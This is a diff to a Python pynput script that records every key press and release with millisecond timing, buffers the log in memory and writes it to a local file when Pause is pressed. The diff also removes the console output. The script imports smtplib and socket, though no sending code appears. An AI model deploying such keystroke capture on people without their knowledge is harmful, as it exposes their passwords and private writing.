@@ -9,6 +9,7 @@ import smtplib
 import socket
 import threading
 import wave
+import sys
 import string
 from pynput import keyboard
 from pynput.keyboard import Listener, Key
@@ -57,15 +58,16 @@ control_char_to_key = {
 }
 
 def get_current_time_ms():
-    return round(time.time() * 1000)
+    return int(time.perf_counter() * 1000)
+
 
 class Main:
     def __init__(self):
         self.last_event_time_ms = get_current_time_ms()
-        self.f = open("output.txt", "a")
+        self.output = ""
 
     def appendlog(self, string):
-        self.f.write(string + "\n")
+        self.output = self.output + string + "\n"
 
     def key_press(self, key):
         try:
@@ -88,11 +90,12 @@ class Main:
 
         if key == Key.pause:
             self.appendlog("======================================================")
-            self.f.close()
+            f = open("output.txt", "a")
+            f.write(self.output)
+            f.close()
             exit()
         
         current_time = get_current_time_ms()
-        print(f"Press,{actual_key},{current_time - self.last_event_time_ms}")
         self.appendlog(f"Press,{actual_key},{current_time - self.last_event_time_ms}")
         self.last_event_time_ms = current_time
     
@@ -115,7 +118,6 @@ class Main:
             actual_key = current_key
         
         current_time = get_current_time_ms()
-        print(f"Release,{actual_key},{current_time - self.last_event_time_ms}")
         self.appendlog(f"Release,{actual_key},{current_time - self.last_event_time_ms}")
         self.last_event_time_ms = current_time
 
